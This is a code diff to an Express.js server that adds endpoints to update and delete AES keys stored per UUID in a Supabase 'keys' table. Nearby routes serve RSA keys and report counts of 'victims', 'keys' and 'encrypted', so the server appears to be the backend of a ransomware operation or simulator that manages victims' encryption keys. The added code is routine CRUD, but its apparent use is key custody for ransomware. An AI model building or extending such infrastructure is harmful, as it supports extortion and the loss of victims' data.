@@ -563,6 +563,52 @@ app.get('/api/rsa-keys', (req, res) => {
   });
 });
 
+// Update key in database
+app.post('/api/db/keys/update', async (req, res) => {
+  if (!supabase) {
+    return res.status(500).json({ success: false, message: 'Supabase not configured' });
+  }
+  try {
+    const { uuid, aes_key } = req.body;
+    if (!uuid || !aes_key) {
+      return res.status(400).json({ success: false, message: 'UUID and aes_key required' });
+    }
+
+    const { error } = await supabase
+      .from('keys')
+      .update({ aes_key })
+      .eq('uuid', uuid);
+
+    if (error) throw error;
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ success: false, message: e.message });
+  }
+});
+
+// Delete key from database
+app.post('/api/db/keys/delete', async (req, res) => {
+  if (!supabase) {
+    return res.status(500).json({ success: false, message: 'Supabase not configured' });
+  }
+  try {
+    const { uuid } = req.body;
+    if (!uuid) {
+      return res.status(400).json({ success: false, message: 'UUID required' });
+    }
+
+    const { error } = await supabase
+      .from('keys')
+      .delete()
+      .eq('uuid', uuid);
+
+    if (error) throw error;
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ success: false, message: e.message });
+  }
+});
+
 app.get('/api/db/stats', async (req, res) => {
   if (!supabase) {
     return res.json({ success: false, victims: 0, keys: 0, encrypted: 0 });
